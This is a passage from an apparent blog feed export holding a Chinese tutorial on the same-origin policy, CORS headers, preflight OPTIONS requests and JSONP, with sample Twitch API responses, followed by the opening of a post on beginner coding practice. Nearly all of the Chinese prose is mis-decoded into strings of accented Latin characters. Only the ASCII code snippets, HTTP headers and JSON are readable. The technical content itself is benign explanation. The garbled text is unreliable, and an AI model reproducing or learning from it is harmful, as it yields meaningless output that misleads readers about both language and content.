ä»€éº¼æ˜¯ä¸åŒæºå‘¢ï¼Ÿå…¶å¯¦ä½ æƒ³ç°¡å–®ä¸€é»ï¼Œåªè¦æ˜¯ Domain ä¸ä¸€æ¨£å°±æ˜¯ä¸åŒæºï¼Œæˆ–è€…æ˜¯ä¸€å€‹ç”¨httpä¸€å€‹ç”¨httpsä¹Ÿæ˜¯ä¸åŒæºï¼Œç«¯å£è™Ÿä¸ä¸€æ¨£ä¹Ÿæ˜¯ä¸åŒæºã€‚
æ‰€ä»¥å¦‚æœä½ æ˜¯æ¥åˆ¥äºº API çš„è©±ï¼Œå¤§å¤šæ•¸æƒ…å½¢éƒ½æ˜¯ä¸åŒæºçš„ã€‚
é€™é‚Šæˆ‘æƒ³å†å¼·èª¿ä¸€é»ï¼Œã€Œä½ çš„ Request é‚„æ˜¯æœ‰ç™¼å‡ºå»çš„ã€ï¼Œè€Œä¸”ç€è¦½å™¨ä¹Ÿã€Œç¢ºå¯¦æœ‰æ”¶åˆ° Responseã€ï¼Œé‡é»æ˜¯ã€Œç€è¦½å™¨å› ç‚ºåŒæºæ”¿ç­–ï¼Œä¸æŠŠçµæœå‚³å›çµ¦ä½ çš„ JavaScriptã€ã€‚å¦‚æœæ²’æœ‰ç€è¦½å™¨çš„è©±å…¶å¯¦å°±æ²’æœ‰é€™äº›å•é¡Œï¼Œä½ æ„›ç™¼çµ¦èª°å°±ç™¼çµ¦èª°ï¼Œä¸ç®¡æ€æ¨£éƒ½æ‹¿å¾—åˆ° Responseã€‚
å¥½ï¼Œæ—¢ç„¶å‰›å‰›èªªäº†ä¸åŒæºæœƒè¢«æ“‹ä¸‹ä¾†ï¼Œé‚£ Twitch API ä¸æ˜¯ä¹Ÿä¸åŒæºå—ï¼Œæ˜¯æ€éº¼ä¸²æ¥æˆåŠŸçš„ï¼Ÿ
CORSå¤§å®¶éƒ½çŸ¥é“å…¶å¯¦åœ¨ä¸åŒæºä¹‹é–“äº’ç›¸å‚³è¼¸è³‡æ–™æ˜¯å¾ˆå¸¸æœ‰çš„äº‹æƒ…ï¼Œåƒæˆ‘å€‘ä¸²æ¥ Twitch API å°±æ˜¯ï¼Œæˆ‘å€‘æ€éº¼å¯èƒ½è·Ÿ Twitch API åœ¨åŒä¸€å€‹ Domain åº•ä¸‹å‘¢ï¼Ÿ
å› æ­¤ï¼ŒåŒæºæ”¿ç­–çš„ç¢ºæ˜¯è¦ç¯„éåŒæºå°±è¢«æ“‹ä¸‹ä¾†ï¼Œä½†èˆ‡æ­¤åŒæ™‚å…¶å¯¦åˆæœ‰å¦å¤–ä¸€å€‹è¦ç¯„ï¼Œæ˜¯èªªï¼šã€Œå¦‚æœä½ æƒ³åœ¨ä¸åŒ origin ä¹‹é–“å‚³è¼¸è³‡æ–™çš„è©±ï¼Œä½ æ‡‰è©²æ€éº¼åšã€ï¼Œé€™è¦ç¯„å°±å«åš CORSã€‚
CORSï¼Œå…¨åç‚º Cross-Origin Resource Sharingï¼Œè·¨ä¾†æºè³‡æºå…±äº«ã€‚
é€™å¥—è¦ç¯„è·Ÿä½ èªªï¼Œå¦‚æœä½ æƒ³é–‹å•Ÿè·¨ä¾†æº HTTP è«‹æ±‚çš„è©±ï¼ŒServer å¿…é ˆåœ¨ Response çš„ Header è£¡é¢åŠ ä¸ŠAccess-Control-Allow-Originã€‚
é€™å€‹å­—æ®µä½ æ‡‰è©²ä¸é™Œç”Ÿæ‰å°ï¼Œè¦ºå¾—é™Œç”Ÿçš„å¯ä»¥æ‹‰å›å»ä¸Šé¢çœ‹ï¼Œå‰›å‰›çš„éŒ¯èª¤è¨Šæ¯å…¶å¯¦å°±æœ‰è¬›åˆ°é€™ä¸€å€‹ Headerã€‚
ç•¶ç€è¦½å™¨æ”¶åˆ° Response ä¹‹å¾Œï¼Œæœƒå…ˆæª¢æŸ¥Access-Control-Allow-Originè£¡é¢çš„å…§å®¹ï¼Œå¦‚æœè£¡é¢æœ‰åŒ…å«ç¾åœ¨é€™å€‹ç™¼èµ· Request çš„ Origin çš„è©±ï¼Œå°±æœƒå…è¨±é€šéï¼Œè®“ç¨‹å¼é †åˆ©æ¥æ”¶åˆ° Responseã€‚
å¦‚æœä½ æ‰“é–‹ Devtool ä»”ç´°çœ‹ä¸€é–‹å§‹æˆ‘å€‘ç™¼çµ¦ Twitch çš„ Requestï¼Œä½ æœƒç™¼ç¾ Response çš„ Header å¤§æ¦‚æ˜¯é•·é€™æ¨£ï¼š
Content-Type: application/jsonContent-Length: 71Connection: keep-aliveServer: nginxAccess-Control-Allow-Origin: *Cache-Control: no-cache, no-store, must-revalidate, privateExpires: 0Pragma: no-cacheTwitch-Trace-Id: e316ddcf2fa38a659fa95af9012c9358X-Ctxlog-Logid: 1-5920052c-446a91950e3abed21a360bd5Timing-Allow-Origin: https://www.twitch.tv

é‡é»æ˜¯é€™ä¸€è¡Œï¼šAccess-Control-Allow-Origin: *ï¼Œæ˜Ÿè™Ÿå°±ä»£è¡¨è¬ç”¨å­—å…ƒï¼Œæ„æ€æ˜¯ä»»ä½•ä¸€å€‹ Origin éƒ½æ¥å—ã€‚æ‰€ä»¥ç•¶ç€è¦½å™¨æ¥æ”¶åˆ°é€™å€‹ Response ä¹‹å¾Œï¼Œæ¯”å°ç›®å‰çš„ Origin ç¬¦åˆ*é€™å€‹è¦å‰‡ï¼Œæª¢é©—é€šéï¼Œå…è¨±æˆ‘å€‘æ¥å—è·¨ä¾†æºè«‹æ±‚çš„å›æ‡‰ã€‚
é™¤äº†é€™å€‹ Header ä»¥å¤–ï¼Œå…¶å¯¦é‚„æœ‰å…¶ä»–çš„å¯ä»¥ç”¨ï¼Œä¾‹å¦‚èªªAccess-Control-Allow-Headersè·ŸAccess-Control-Allow-Methodsï¼Œå°±å¯ä»¥å®šç¾©æ¥å—å“ªäº› Request Header ä»¥åŠæ¥å—å“ªäº› Methodã€‚
ç¸½çµä¸€ä¸‹ï¼Œå¦‚æœä½ æƒ³è¦ç™¼èµ·è·¨ä¾†æº HTTP è«‹æ±‚ä¸¦ä¸”é †åˆ©æ”¶åˆ°å›æ‡‰çš„è©±ï¼Œéœ€è¦ç¢ºä¿ Server ç«¯æœ‰åŠ ä¸ŠAccess-Control-Allow-Originï¼Œä¸ç„¶ Response æœƒè¢«ç€è¦½å™¨çµ¦æ“‹ä¸‹ä¾†ä¸¦ä¸”é¡¯ç¤ºå‡ºéŒ¯èª¤è¨Šæ¯ã€‚
Preflight Requesté‚„è¨˜å¾— Twitch çš„ API æ–‡ä»¶å—ï¼Ÿè£¡é¢éœ€è¦å¸¶ä¸€å€‹client-idçš„åƒæ•¸ï¼Œè€Œæ–‡ä»¶è£¡é¢å¯«èªªä½ å¯ä»¥å¸¶åœ¨ GET çš„åƒæ•¸ä¸Šé¢ï¼Œä¹Ÿå¯ä»¥å¸¶åœ¨ Header è£¡ï¼Œæˆ‘å€‘ä¾†è©¦è©¦çœ‹å¸¶åœ¨ Header è£¡æœƒæ€æ¨£å§ï¼æ‰“é–‹ Devtoolï¼Œä½ æœƒçœ‹åˆ°ä¸€å€‹ç¥å¥‡çš„ç¾è±¡ï¼š

å’¦ï¼Ÿæˆ‘æ˜æ˜åªç™¼äº†ä¸€å€‹ Requestï¼Œæ€éº¼è®Šå…©å€‹äº†ï¼Ÿè€Œä¸”ç¬¬ä¸€å€‹çš„ Method å±…ç„¶æ˜¯OPTIONSã€‚åªæ˜¯å¤šåŠ äº†ä¸€å€‹ Header å°±å¤šäº†ä¸€å€‹ Requestï¼Œæ˜¯ç‚ºä»€éº¼å‘¢ï¼Ÿ
å…¶å¯¦é€™åˆè·Ÿä¸Šé¢è¬›çš„ CORS æœ‰é—œäº†ï¼ŒCORS æŠŠ Request åˆ†æˆå…©ç¨®ï¼Œä¸€ç¨®æ˜¯ç°¡å–®è«‹æ±‚ï¼ˆsimple requestsï¼‰ã€‚ä»€éº¼æ˜¯ç°¡å–®è«‹æ±‚å‘¢ï¼Ÿå…¶å¯¦å®šç¾©æœ‰æ»¿é•·ä¸€ä¸²çš„ï¼Œæˆ‘èªç‚ºæœ‰éœ€è¦ç”¨åˆ°çš„æ™‚å€™å†çœ‹å°±å¥½ï¼Œä½†ç¸½ä¹‹å¦‚æœä½ æ²’æœ‰åŠ ä»»ä½•è‡ªå®šç¾©çš„ Headerï¼Œè€Œä¸”åˆæ˜¯ GET çš„è©±ï¼Œçµ•å°æ˜¯ç°¡å–®è«‹æ±‚ï¼ˆé€™å€‹å¤ ç°¡å–®äº†å§ï¼‰
åä¹‹å‘¢ï¼Œå¦‚æœä½ æœ‰åŠ ä¸€äº›è‡ªå®šç¾©çš„ Headerï¼Œä¾‹å¦‚èªªæˆ‘å€‘å‰›å‰›åŠ çš„Client-IDï¼Œé€™å€‹ Request å°±çµ•å°ä¸æ˜¯ç°¡å–®è«‹æ±‚ã€‚
ï¼ˆå®šç¾©å¯åƒè€ƒï¼šMDN: ç°¡å–®è«‹æ±‚ï¼‰
å¾ä¸Šè¿°åˆ†é¡å¯çŸ¥ï¼Œæˆ‘å€‘å‰›å‰›ç™¼èµ·çš„ Request å› ç‚ºæœ‰å¸¶äº† Custom headerï¼Œæ‰€ä»¥ä¸æœƒæ˜¯ç°¡å–®è«‹æ±‚ï¼Œé‚£ç‚ºä»€éº¼æœƒå¤šä¸€å€‹ Request å‘¢ï¼Ÿ
é€™ä¸€å€‹ Request å«åš Preflight Requestï¼Œä¸­æ–‡ç¿»ä½œã€Œé æª¢è«‹æ±‚ã€ï¼Œå› ç‚ºéç°¡å–®è«‹æ±‚å¯èƒ½æœƒå¸¶æœ‰ä¸€äº›ä½¿ç”¨è€…è³‡æ–™ï¼Œå› æ­¤æœƒå…ˆé€é Preflight Request å»ç¢ºèªå¾ŒçºŒçš„è«‹æ±‚èƒ½å¦é€å‡ºã€‚
å¦‚æœé€™å€‹ Preflight Request æ²’æœ‰éçš„è©±ï¼ŒçœŸçš„ Request ä¹Ÿå°±ä¸æœƒç™¼é€äº†ï¼Œé€™å°±æ˜¯é æª¢è«‹æ±‚çš„ç›®çš„ã€‚
æˆ‘èˆ‰ä¸€å€‹ä¾‹å­ï¼Œä½ å°±æœƒçŸ¥é“ç‚ºä»€éº¼éœ€è¦é€™å€‹ Preflight Request äº†ã€‚
å‡è¨­ä»Šå¤©æŸå€‹ Server æä¾›äº†ä¸€å€‹ API ç¶²å€å«åšï¼šhttps://example.com/data/16ï¼Œä½ åªè¦å°å®ƒç™¼é€ GETï¼Œå°±èƒ½å¤ æ‹¿åˆ° id æ˜¯ 16 çš„è³‡æ–™ï¼Œåªè¦å°å®ƒç™¼é€ DELETEï¼Œå°±å¯ä»¥æŠŠé€™ç­†è³‡æ–™åˆªé™¤ã€‚
å¦‚æœä»Šå¤©æ²’æœ‰ Preflight Request é€™å€‹æ©Ÿåˆ¶çš„è©±ï¼Œæˆ‘å°±å¯ä»¥åœ¨éš¨ä¾¿ä¸€å€‹ Domain çš„ç¶²é ä¸Šé¢ç™¼é€ä¸€å€‹ DELETE çš„ Request çµ¦é€™å€‹ APIã€‚å‰›å‰›æˆ‘æœ‰å¼·èª¿èªªç€è¦½å™¨çš„ CORS æ©Ÿåˆ¶ï¼Œé‚„æ˜¯æœƒå¹«ä½ ç™¼é€ Requestï¼Œä½†åªæ˜¯ Response è¢«ç€è¦½å™¨æ“‹ä½è€Œå·²ã€‚
å› æ­¤å‘¢ï¼Œå„˜ç®¡æ²’æœ‰ Responseï¼Œä½†æ˜¯ Server ç«¯çš„ç¢ºæ”¶åˆ°äº†é€™å€‹ Requestï¼Œå› æ­¤å°±æœƒæŠŠé€™ç­†è³‡æ–™çµ¦åˆªé™¤ã€‚
å¦‚æœæœ‰ Preflight Request çš„è©±ï¼Œåœ¨ç™¼é€å‡ºå»æ”¶åˆ°çµæœçš„æ™‚å€™ï¼Œå°±æœƒçŸ¥é“é€™å€‹ API ä¸¦æ²’æœ‰æä¾› CORSï¼Œå› æ­¤çœŸçš„ DELETE è«‹æ±‚å°±ä¸æœƒé€å‡ºï¼Œåˆ°é€™é‚Šå°±çµæŸäº†ã€‚
å…ˆç”¨ä¸€å€‹ OPTIONS çš„è«‹æ±‚å»ç¢ºèªä¹‹å¾Œçš„ Request èƒ½ä¸èƒ½é€å‡ºï¼Œé€™å°±æ˜¯ Preflight Request çš„ç›®çš„ã€‚
JSONPæœ€å¾Œä¾†è¬›ä¸€ä¸‹ JSONPï¼Œé€™æ˜¯è·¨ä¾†æºè«‹æ±‚é™¤äº† CORS ä»¥å¤–çš„å¦å¤–ä¸€ç¨®æ–¹æ³•ï¼Œå…¨åå«åšï¼šJSON with Paddingã€‚
é‚„è¨˜å¾—ä¸€é–‹å§‹æåˆ°çš„åŒæºæ”¿ç­–å§ï¼Ÿä»”ç´°æ€è€ƒä¸€ä¸‹æœƒç™¼ç¾ï¼Œå…¶å¯¦æœ‰äº›æ±è¥¿æ˜¯ä¸å—åŒæºæ”¿ç­–é™åˆ¶çš„ï¼Œä¾‹å¦‚èªª&lt;script&gt;é€™å€‹ Tagï¼Œæˆ‘å€‘ä¸æ˜¯å¸¸å¸¸å¼•ç”¨ CDN æˆ–æ˜¯ Google Analytics ä¹‹é¡çš„ç¬¬ä¸‰æ–¹å¥—ä»¶å—ï¼Ÿç¶²å€éƒ½æ˜¯å…¶ä»– Domain çš„ï¼Œä½†æ˜¯å»èƒ½æ­£å¸¸è¼‰å…¥ã€‚
JSONP å°±æ˜¯åˆ©ç”¨&lt;script&gt;çš„é€™å€‹ç‰¹æ€§ä¾†é”æˆè·¨ä¾†æºè«‹æ±‚çš„ã€‚
ä»Šå¤©å…ˆæƒ³åƒä½ æœ‰ä¸€æ®µ HTML é•·é€™æ¨£ï¼š
&lt;script&gt;  var response = &#123;    data: &#x27;test&#x27;  &#125;;&lt;/script&gt;&lt;script&gt;  console.log(response);&lt;/script&gt;

å¾ˆå¥½æ‡‚çš„ä¸€æ®µç¨‹å¼ç¢¼ï¼Œæˆ‘å°±ä¸å¤šåšè§£é‡‹äº†ã€‚é‚£å¦‚æœä»Šå¤©æŠŠä¸Šé¢é‚£ä¸€æ®µæ›æˆä¸€ä¸²ç¶²å€å‘¢ï¼Ÿ
&lt;script src=&quot;https://another-origin.com/api/games&quot;&gt;&lt;/script&gt;&lt;script&gt;  console.log(response);&lt;/script&gt;

å¦‚æœhttps://another-origin.com/api/gamesé€™å€‹ç¶²å€è¿”å›çš„å…§å®¹å°±æ˜¯å‰›å‰›çš„ï¼š
var response = &#123;  data: &#x27;test&#x27;&#125;;

é‚£æˆ‘ä¸å°±ä¸€æ¨£å¯ä»¥æ‹¿åˆ°è³‡æ–™äº†å—ï¼Ÿè€Œä¸”é€™äº›è³‡æ–™é‚„æ˜¯ Server ç«¯æ§åˆ¶çš„ï¼Œæ‰€ä»¥ Server å¯ä»¥çµ¦æˆ‘ä»»ä½•è³‡æ–™ã€‚ä½†æ˜¯é€™æ¨£ç”¨å…¨åŸŸè®Šæ•¸å…¶å¯¦ä¸å¤ªå¥½ï¼Œæˆ‘å€‘å¯ä»¥å€Ÿç”¨å‰›å‰›çš„ Callback Function çš„æ¦‚å¿µï¼Œæ”¹æˆé€™æ¨£ï¼š
&lt;script&gt;  receiveData(&#123;    data: &#x27;test&#x27;  &#125;);&lt;/script&gt;&lt;script&gt;  function receiveData (response) &#123;    console.log(response);  &#125;&lt;/script&gt;

æ‰€ä»¥ JSONP æ˜¯ä»€éº¼ï¼ŸJSONP å…¶å¯¦å°±æ˜¯é€éä¸Šé¢é€™ç¨®å½¢å¼ï¼Œåˆ©ç”¨&lt;script&gt;è£¡é¢æ”¾è³‡æ–™ï¼Œé€éæŒ‡å®šå¥½çš„ function æŠŠè³‡æ–™çµ¦å¸¶å›å»ã€‚ä½ åªè¦æŠŠç¬¬ä¸€æ®µçš„&lt;script&gt;é‚£é‚Šæƒ³æˆæ˜¯ Server çš„å›å‚³å€¼ï¼Œä½ å°±å¯ä»¥ç†è§£äº†ã€‚
å¯¦å‹™ä¸Šåœ¨æ“ä½œ JSONP çš„æ™‚å€™ï¼ŒServer é€šå¸¸æœƒæä¾›ä¸€å€‹callbackçš„åƒæ•¸è®“ client ç«¯å¸¶éå»ã€‚Twitch API æœ‰æä¾› JSONP çš„ç‰ˆæœ¬ï¼Œæˆ‘å€‘å¯ä»¥ç›´æ¥ä¾†çœ‹ç¯„ä¾‹ï¼š
URL: https://api.twitch.tv/kraken/games/top?client_id=xxx&amp;callback=aaa&amp;limit=1
aaa(&#123;&quot;_total&quot;:1069,&quot;_links&quot;:&#123;&quot;self&quot;:&quot;https://api.twitch.tv/kraken/games/top?limit=1&quot;,&quot;next&quot;:&quot;https://api.twitch.tv/kraken/games/top?limit=1\u0026offset=1&quot;&#125;,&quot;top&quot;:[&#123;&quot;game&quot;:&#123;&quot;name&quot;:&quot;Dota 2&quot;,&quot;popularity&quot;:63361,&quot;_id&quot;:29595,&quot;giantbomb_id&quot;:32887,&quot;box&quot;:&#123;&quot;large&quot;:&quot;https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-272x380.jpg&quot;,&quot;medium&quot;:&quot;https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-136x190.jpg&quot;,&quot;small&quot;:&quot;https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-52x72.jpg&quot;,&quot;template&quot;:&quot;https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg&quot;&#125;,&quot;logo&quot;:&#123;&quot;large&quot;:&quot;https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-240x144.jpg&quot;,&quot;medium&quot;:&quot;https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-120x72.jpg&quot;,&quot;small&quot;:&quot;https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-60x36.jpg&quot;,&quot;template&quot;:&quot;https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg&quot;&#125;,&quot;_links&quot;:&#123;&#125;,&quot;localized_name&quot;:&quot;Dota 2&quot;,&quot;locale&quot;:&quot;zh-tw&quot;&#125;,&quot;viewers&quot;:65243,&quot;channels&quot;:373&#125;]&#125;)

URL: https://api.twitch.tv/kraken/games/top?client_id=xxx&amp;callback=receiveData&amp;limit=1
receiveData(&#123;&quot;_total&quot;:1067,&quot;_links&quot;:&#123;&quot;self&quot;:&quot;https://api.twitch.tv/kraken/games/top?limit=1&quot;,&quot;next&quot;:&quot;https://api.twitch.tv/kraken/games/top?limit=1\u0026offset=1&quot;&#125;,&quot;top&quot;:[&#123;&quot;game&quot;:&#123;&quot;name&quot;:&quot;Dota 2&quot;,&quot;popularity&quot;:63361,&quot;_id&quot;:29595,&quot;giantbomb_id&quot;:32887,&quot;box&quot;:&#123;&quot;large&quot;:&quot;https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-272x380.jpg&quot;,&quot;medium&quot;:&quot;https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-136x190.jpg&quot;,&quot;small&quot;:&quot;https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-52x72.jpg&quot;,&quot;template&quot;:&quot;https://static-cdn.jtvnw.net/ttv-boxart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg&quot;&#125;,&quot;logo&quot;:&#123;&quot;large&quot;:&quot;https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-240x144.jpg&quot;,&quot;medium&quot;:&quot;https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-120x72.jpg&quot;,&quot;small&quot;:&quot;https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-60x36.jpg&quot;,&quot;template&quot;:&quot;https://static-cdn.jtvnw.net/ttv-logoart/Dota%202-&#123;width&#125;x&#123;height&#125;.jpg&quot;&#125;,&quot;_links&quot;:&#123;&#125;,&quot;localized_name&quot;:&quot;Dota 2&quot;,&quot;locale&quot;:&quot;zh-tw&quot;&#125;,&quot;viewers&quot;:65622,&quot;channels&quot;:376&#125;]&#125;)

æœ‰ç™¼ç¾äº†å—ï¼Ÿå®ƒå°±æ˜¯é€éä½ å¸¶éå»çš„callbacké€™å€‹åƒæ•¸ç•¶ä½œå‡½å¼åç¨±ï¼ŒæŠŠ JavaScript ç‰©ä»¶æ•´å€‹å‚³åˆ° Function è£¡é¢ï¼Œä½ å°±å¯ä»¥åœ¨ Function è£¡é¢æ‹¿åˆ°è³‡æ–™ã€‚
çµåˆèµ·ä¾†æœƒè®Šé€™æ¨£ï¼š
&lt;script src=&quot;https://api.twitch.tv/kraken/games/top?client_id=xxx&amp;callback=receiveData&amp;limit=1&quot;&gt;&lt;/script&gt;&lt;script&gt;  function receiveData (response) &#123;    console.log(response);  &#125;&lt;/script&gt;

åˆ©ç”¨ JSONPï¼Œä¹Ÿå¯ä»¥å­˜å–è·¨ä¾†æºçš„è³‡æ–™ã€‚ä½† JSONP çš„ç¼ºé»å°±æ˜¯ä½ è¦å¸¶çš„é‚£äº›åƒæ•¸æ°¸é éƒ½åªèƒ½ç”¨é™„åŠ åœ¨ç¶²å€ä¸Šçš„æ–¹å¼ï¼ˆGETï¼‰å¸¶éå»ï¼Œæ²’è¾¦æ³•ç”¨ POSTã€‚
å¦‚æœèƒ½ç”¨ CORS çš„è©±ï¼Œé‚„æ˜¯æ‡‰è©²å„ªå…ˆè€ƒæ…® CORSã€‚
ç¸½çµä»Šå¤©é€™ç¯‡æ–‡ç« çš„å…§å®¹å°±æ˜¯å¾æŠ“è³‡æ–™é€™ä»¶äº‹æƒ…é–‹å§‹ï¼Œä¸€æ­¥æ­¥å‘Šè¨´ä½ æ‡‰è©²å»å“ªè£¡æŠ“ï¼Ÿæ‡‰è©²æ€éº¼æŠ“ï¼Ÿç”¨ API æŠ“ï¼Œé‚£ä»€éº¼æ˜¯ APIï¼Ÿæ€éº¼åœ¨ JavaScript è£¡é¢å‘¼å« Web APIï¼Ÿæ€éº¼æ¨£å­˜å–è·¨ä¾†æºçš„è³‡æ–™ï¼Ÿ
ä¸€èˆ¬ä¾†èªªï¼Œè·Ÿå‰ç«¯æŠ“è³‡æ–™æœ‰é—œçš„æ±è¥¿æˆ‘åŸºæœ¬ä¸Šéƒ½æåˆ°äº†ï¼Œä¸éæœ‰å€‹éºç ä¹‹æ†¾æ˜¯æ²’æœ‰æåˆ°Fetch APIï¼Œé€™æ˜¯æ¯”è¼ƒæ–°çš„æ¨™æº–ï¼Œä¹Ÿæ˜¯æ‹¿ä¾†æŠ“è³‡æ–™ç”¨çš„ï¼ŒMDN ä¸Šé¢çš„ä»‹ç´¹æ˜¯ï¼š

The Fetch API provides an interface for fetching resources (including across the network). It will seem familiar to anyone who has used XMLHttpRequest, but the new API provides a more powerful and flexible feature set.

æœ‰èˆˆè¶£çš„è®€è€…å€‘å¯ä»¥è‡ªå·±å»çœ‹ä¸€ä¸‹ã€‚
å¸Œæœ›å¤§å®¶çœ‹å®Œé€™ç¯‡ä¹‹å¾Œï¼Œæœƒæ›´äº†è§£æ€éº¼æ¨£ä¸²æ¥å¾Œç«¯ APIï¼Œä»¥åŠä¸²æ¥çš„æ™‚å€™å¯èƒ½æœƒç¢°åˆ°å“ªäº›å›°é›£ã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>xhr</tag>
        <tag>ajax</tag>
        <tag>cors</tag>
        <tag>jsonp</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¨‹å¼è§£é¡Œæ–°æ‰‹å…¥é–€æ³¨æ„äº‹é …</title>
    <url>/2019/11/02/before-start-leetcode/</url>
    <content><![CDATA[å‰è¨€åœ¨é€™å…©ä¸‰å¹´ä¹‹é–“ï¼Œã€Œåˆ·é¡Œã€ä¼¼ä¹æˆç‚ºäº†ä¸€ç¨®é¢¨æ½®ã€‚æœ¬ç§‘ç³»è¦å»é¢è©¦å¤§å…¬å¸çš„æ™‚å€™è¦åˆ·é¡Œï¼Œéæœ¬ç§‘ç³»å‡ºå»é¢è©¦ä¹Ÿè¦åˆ·é¡Œï¼Œå¥½åƒåªè¦æ²’æœ‰åˆ·é¡Œå°±æœƒè½å¾Œä»–äººï¼Œå°±æœƒè¢«å…¬å¸åˆ·æ‰ã€‚
å…¶å¯¦æˆ‘ä¸€ç›´ä¸æ˜¯å¾ˆå–œæ­¡ã€Œåˆ·é¡Œã€é€™å€‹è©ï¼Œä¸»è¦æ˜¯å› ç‚ºã€Œåˆ·ã€é€™å€‹å­—ã€‚ä¸çŸ¥é“å¤§å®¶å°é€™å€‹å­—çš„è§£è®€æ˜¯ä»€éº¼ï¼Œä½†æˆ‘æœƒèªç‚ºæœ‰ç¨®ã€Œç‚ºäº†å¯«é¡Œç›®è€Œå¯«é¡Œç›®ã€çš„æ„Ÿè¦ºï¼Œå°±å¥½åƒé¡Œæµ·æˆ°è¡“é‚£æ¨£ã€‚é›–ç„¶èªªé¡Œæµ·æˆ°è¡“ç”¨å¾—å¥½çš„è©±æˆæ•ˆæ»¿é¡¯è‘—çš„ï¼Œä½†ç¸½æ„Ÿè¦ºå¾ˆå¤šäººåˆ·åˆ°æœ€å¾Œæœƒè®Šæˆã€Œçœ‹éçš„é¡Œç›®å°±æœƒï¼Œæ²’çœ‹éçš„å°±ä¸€å®šä¸æœƒã€ï¼Œå¦‚æœæ˜¯é€™æ¨£å­çš„è©±ï¼Œé‚£æˆ‘è¦ºå¾—ä¸æ˜¯ä¸€ä»¶å¥½äº‹ã€‚
ä¹‹å‰æˆ‘æœ‰å¯«äº†ä¸€ç¯‡æ–‡ç« ï¼šç•¶æˆ‘å€‘åœ¨å­¸ç¨‹å¼æ™‚ï¼Œè¦å­¸çš„åˆ°åº•æ˜¯ä»€éº¼ï¼Ÿï¼Œç¨å¾®è«‡äº†ä¸€ä¸‹é€™ä»¶äº‹æƒ…ã€‚
ç¸½ä¹‹å‘¢ï¼Œæ¯”èµ·åˆ·é¡Œé€™å€‹è©ï¼Œæˆ‘æ›´å–œæ­¡ç”¨ã€Œç¨‹å¼è§£é¡Œã€å››å€‹å­—ä¾†è¡¨é”æˆ‘æƒ³è¡¨é”çš„æ„æ€ã€‚


æœ‰å¾ˆå¤šäººå‰›é–‹å§‹ç·´ç¿’ç¨‹å¼è§£é¡Œçš„æ™‚å€™ï¼Œæ˜¯å¾æ¼”ç®—æ³•èˆ‡è³‡æ–™çµæ§‹é–‹å§‹çš„ã€‚å¯èƒ½å»æ‰¾äº†ä¸€äº›æ›¸æˆ–æ˜¯ç·šä¸Šèª²ç¨‹ä¾†çœ‹ï¼Œæ¥è‘—å¾ç¶“å…¸çš„é–‹å§‹ï¼Œä¾‹å¦‚èªªæ³¡æ²«æ’åºã€é¸æ“‡æ’åºã€æ’å…¥æ’åºï¼Œå†ä¾†æ˜¯å›°é›£ä¸€äº›çš„åˆä½µæ’åºä»¥åŠå¿«é€Ÿæ’åºç­‰ç­‰ã€‚ä½†æˆ‘è¦ºå¾—å°çœŸæ­£çš„åˆå­¸è€…ä¾†èªªï¼Œå­¸é€™äº›é‚„å¤ªæ—©äº†ã€‚
ç°¡å–®ä¾†èªªå°±æ˜¯ï¼šã€Œå¦‚æœä½ å¯«ä¸å‡ºä¹ä¹ä¹˜æ³•è¡¨ï¼Œä½ æœƒå¯« KMPï¼ˆå¯ä»£æ›æˆä»»ä½•æ¼”ç®—æ³•ï¼‰ä¹Ÿæ²’ä»€éº¼ç”¨ã€‚ã€å¦‚æœæœ‰å…©å€‹äººï¼ŒA æœƒå¯«ä¹ä¹ä¹˜æ³•è¡¨ä½†å¯«ä¸å‡º KMPï¼ŒB æœƒå¯« KMP ä½†å¯«ä¸å‡ºä¹ä¹ä¹˜æ³•è¡¨ï¼Œæˆ‘ä¸€å®šæŠŠ B æ·˜æ±°æ‰ã€‚å› ç‚º B å¾ˆæœ‰å¯èƒ½æ˜¯ç›´æ¥æŠŠ KMP çš„å¯«æ³•è¨˜èµ·ä¾†ï¼Œè€Œä¸æ˜¯çœŸçš„ç†è§£ï¼Œå¦å‰‡æˆ‘ä¸ç›¸ä¿¡ä»–å¯«ä¸å‡ºä¾†ä¹ä¹ä¹˜æ³•è¡¨ã€‚
åœ¨é€™é‚Šä¹Ÿèª æ‘¯å‘¼ç±²å„å€‹å…¬å¸åœ¨é¢è©¦çš„æ™‚å€™å¯ä»¥è€ƒé‚£ç¨®æ¯”è¼ƒç°¡å–®çš„é¡Œç›®ï¼Œæœ‰æ™‚å€™æˆæ•ˆæœƒå‡ºä¹æ„æ–™çš„å¥½ã€‚ä¾‹å¦‚èªªæ‰¾ä¸­ä½æ•¸ã€åˆ¤æ–·è³ªæ•¸æˆ–æ˜¯å¤§æ•¸åŠ æ³•ä¹‹é¡çš„ï¼Œæœƒç™¼ç¾æœ‰äº›äººé‚„çœŸçš„å¯«ä¸å‡ºä¾†ã€‚
ç¸½ä¹‹å‘¢ï¼Œæˆ‘èªç‚ºè¦é€éç¨‹å¼è§£é¡Œä¾†ç†Ÿæ‚‰æ¼”ç®—æ³•æ˜¯çµ•å°æ²’å•é¡Œçš„ï¼Œä¹Ÿæ˜¯å¾ˆæ£’çš„ä¸€å€‹æ–¹æ³•ï¼Œä½†åŸºç¤è¦æ‰“ç©©ï¼Œæ²’æœ‰æ‰“ç©©çš„è©±å°±åªæ˜¯åœ¨èƒŒé¡Œç›®è€Œå·²ã€‚
